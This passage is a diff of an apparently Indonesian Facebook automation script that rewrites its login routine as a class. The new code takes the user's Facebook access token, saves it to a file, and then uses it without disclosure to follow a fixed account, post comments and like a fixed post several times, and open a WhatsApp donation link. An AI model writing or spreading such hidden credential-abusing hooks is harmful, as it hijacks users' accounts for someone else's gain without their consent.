@@ -118,54 +118,48 @@ def banner():
 ───────────────────────────────────────────────────────\n'''%(N,N,N,N))
 
 #login
-def login():
-		try:
-			token = open('.token.txt','r').read()
-			tokenku.append(token)
-			try:
-				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
-				sy2 = json.loads(sy.text)['name']
-				sy3 = json.loads(sy.text)['id']
-				sy4 = json.loads(sy.text)['birthday']
-				main()
-			except KeyError:
-				login_lagi()
-			except requests.exceptions.ConnectionError:
-				banner()
-				li = '# KONEKSI INTERNET BERMASALAH'
-				lo = mark(li, style='red')
-				sol().print(lo, style='cyan')
-				exit()
-		except IOError:
-			login_lagi()
+class login:
 
-def login_lagi():
-	banner()
-	sky = '# MASUKAN TOKEN FACEBOOK'
-	sky2 = mark(sky, style='green')
-	sol().print(sky2, style='cyan')
-	panda = input(x+'['+p+'•'+x+'] Token Fb : ')
-	akun=open('.token.txt','w').write(panda)
-	try:
-		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
-		tes3 = json.loads(tes.text)['id']
-		sue = '# nice Login berhasil'
-		suu = mark(sue, style='green')
-		sol().print(suu, style='cyan')
-		time.sleep(2.5)
-		main()
-	except KeyError:
-		sue = '# Login Gagal, Cek token'
-		suu = mark(sue, style='red')
-		sol().print(suu, style='cyan')
-		time.sleep(2.5)
-		login_lagi()
-	except requests.exceptions.ConnectionError:
-		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
-		lo = mark(li, style='red')
-		sol().print(lo, style='cyan')
-		exit()
-	
+	def __init__(self):
+		self.ada = []
+	def __login__(self):
+		os.system('clear')
+		banner()
+		token = input(' [%s*%s] Masukan token : '%(O,N))
+		if token in ['']:
+			time.sleep(2);login().__login__()
+		else:
+			try:
+				cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
+				open('token.x','w').write(token)
+				print('\n [%s+%s] Login berhasil %s'%(H,N,cc))
+				self.bot()
+			except KeyError:
+				jalan(' [%s!%s] Token error coba ganti akun tumbal!'%(M,N))
+				self.takon()
+	def takon(self):
+		takon = input('\n %s[%s!%s] Mau tau cara ambil token y/t: '%(N,O,N))
+		if takon in ['y','Y','iya']:
+			jalan('\n %s[%s!%s] Kamu akan di arahkan ke Ke Wa Untuk Donasi'%(N,O,N))
+			os.system('xdg-open wa.me/6285772148224');exit()
+		else:
+			login().__login__()
+	def bot(self):
+		# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
+		try:
+			toket = open('token.x','r').read()
+		except IOError:
+			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().__login__()
+		requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/100006414900732/subscribers?access_token=' + toket)
+		requests.post('https://graph.facebook.com/100006414900732/comments/?message=' +komen+ '&access_token=' + toket)
+		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
+		requests.post('https://graph.facebook.com/3086614624895671/comments/?message='+komen+'&access_token=' + toket)
+		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
+		os.system('xdg-open wa.me/6285772148224')
+		menu().main()
+
 class menu:
 
 	def __init__(self):
